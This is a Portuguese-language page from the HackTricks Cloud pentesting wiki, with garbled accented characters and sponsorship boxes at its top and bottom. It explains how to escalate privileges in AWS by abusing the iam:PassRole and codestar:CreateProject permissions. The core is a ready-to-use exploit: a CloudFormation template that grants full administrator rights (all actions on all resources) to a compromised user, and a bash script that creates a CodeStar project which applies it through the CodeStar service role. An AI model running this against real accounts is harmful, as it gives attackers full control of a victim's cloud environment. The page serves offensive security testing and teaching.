# iam:PassRole, codestar:CreateProject

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>

Com essas permiss√µes, voc√™ pode **abusar de uma fun√ß√£o IAM do codestar** para realizar **a√ß√µes arbitr√°rias** por meio de um **modelo de cloudformation**.

Para explorar isso, voc√™ precisa criar um **bucket S3 que seja acess√≠vel** pela conta atacada. Fa√ßa upload de um arquivo chamado `toolchain.json`. Este arquivo deve conter o **modelo de explora√ß√£o de cloudformation**. O seguinte pode ser usado para definir uma pol√≠tica gerenciada para um usu√°rio sob seu controle e **dar a ele permiss√µes de administrador**:

{% code title="toolchain.json" %}
```json
{
    "Resources": {
        "supercodestar": {
            "Type": "AWS::IAM::ManagedPolicy",
            "Properties": {
                "ManagedPolicyName": "CodeStar_supercodestar",
                "PolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Action": "*",
                            "Resource": "*"
                        }
                    ]
                },
                "Users": [
                    "<nome de usu√°rio comprometido>"
                ]
            }
        }
    }
}
```
{% endcode %}

Tamb√©m **fa√ßa upload** deste arquivo `zip vazio` para o **bucket**:

{% file src="../../../../.gitbook/assets/empty.zip" %}

Lembre-se de que o **bucket com ambos os arquivos deve ser acess√≠vel pela conta da v√≠tima**.

Com ambas as coisas carregadas, voc√™ pode agora prosseguir com a **explora√ß√£o** criando um projeto **codestar**:

```bash
PROJECT_NAME="supercodestar"

# Crie o JSON de origem
## Neste JSON, o bucket e a chave (caminho) para o arquivo empry.zip s√£o usados
SOURCE_CODE_PATH="/tmp/surce_code.json"
SOURCE_CODE="[
    {
        \"source\": {
            \"s3\": {
                \"bucketName\": \"privesc\",
                \"bucketKey\": \"empty.zip\"
            }
    },
        \"destination\": {
            \"codeCommit\": {
                \"name\": \"$PROJECT_NAME\"
            }
        }
    }
]"
printf "$SOURCE_CODE" > $SOURCE_CODE_PATH

# Crie o JSON da ferramenta
## Neste JSON, o bucket e a chave (caminho) para o arquivo toolchain.json s√£o usados
TOOLCHAIN_PATH="/tmp/tool_chain.json"
TOOLCHAIN="{
    \"source\": {
        \"s3\": {
            \"bucketName\": \"privesc\",
            \"bucketKey\": \"toolchain.json\"
        }
    },
    \"roleArn\": \"arn:aws:iam::947247140022:role/service-role/aws-codestar-service-role\"
}"
printf "$TOOLCHAIN" > $TOOLCHAIN_PATH

# Crie o projeto codestar que usar√° a explora√ß√£o de cloudformation para privesc
aws codestar create-project \
    --name $PROJECT_NAME \
    --id $PROJECT_NAME \
    --source-code file://$SOURCE_CODE_PATH \
    --toolchain file://$TOOLCHAIN_PATH
```

Essa explora√ß√£o √© baseada no **exploit Pacu desses privil√©gios**: [https://github.com/RhinoSecurityLabs/pacu/blob/2a0ce01f075541f7ccd9c44fcfc967cad994f9c9/pacu/modules/iam\_\_privesc\_scan/main.py#L1997](https://github.com/RhinoSecurityLabs/pacu/blob/2a0ce01f075541f7ccd9c44fcfc967cad994f9c9/pacu/modules/iam\_\_privesc\_scan/main.py#L1997) Nele, voc√™ pode encontrar uma varia√ß√£o para criar uma pol√≠tica gerenciada de administrador para uma fun√ß√£o em vez de um usu√°rio.

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>